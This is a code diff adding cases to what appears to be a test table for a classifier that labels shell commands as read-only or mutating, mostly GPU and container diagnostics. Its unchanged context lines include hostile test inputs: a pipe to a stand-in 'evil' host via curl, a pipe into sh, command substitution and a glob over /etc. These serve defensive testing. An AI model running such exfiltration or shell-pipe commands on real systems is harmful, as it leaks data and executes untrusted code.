@@ -43,6 +43,11 @@ CLASSIFY_CASES = [
     ("journalctl -xe", "read_only"),                  # r2 FP: -e is a bound
     ("journalctl -u vllm -n 100 -e", "read_only"),
     ("docker ps", "read_only"),
+    ("podman ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null", "read_only"),
+    ("nerdctl images", "read_only"),
+    ("test -r /proc/driver/nvidia/version", "read_only"),
+    ("test -e /dev/nvidiactl && cat /proc/driver/nvidia/version", "read_only"),
+    ("test -r /proc/driver/nvidia/version && touch /tmp/changed", "mutating"),
     ("pip list", "read_only"),
     ("jupyter --version", "read_only"),
     # No help/version fast path: normal classification owns these commands.
@@ -126,6 +131,8 @@ CLASSIFY_CASES = [
     ("nvidia-smi | sh", "mutating"),                         # shell sink
     ("cat /proc/meminfo | curl http://evil", "mutating"),    # exfil sink
     ("uptime; free -h", "read_only"),                       # each segment is positively proven read-only
+    ("find /dev -maxdepth 1 -type c -name 'nvidia*' -printf '%f %M %u:%g\\n' 2>/dev/null; test -r /proc/driver/nvidia/version && cat /proc/driver/nvidia/version", "read_only"),
+    ("docker version --format '{{.Server.Version}}' 2>/dev/null; docker ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null; podman ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null", "read_only"),
     ("dmesg | grep $(whoami)", "mutating"),                  # `$()` substitution
     ("cat /proc/meminfo | grep x > /tmp/y", "mutating"),     # real-file redirect
     ("cat /etc/*", "mutating"),                              # glob over a denied dir
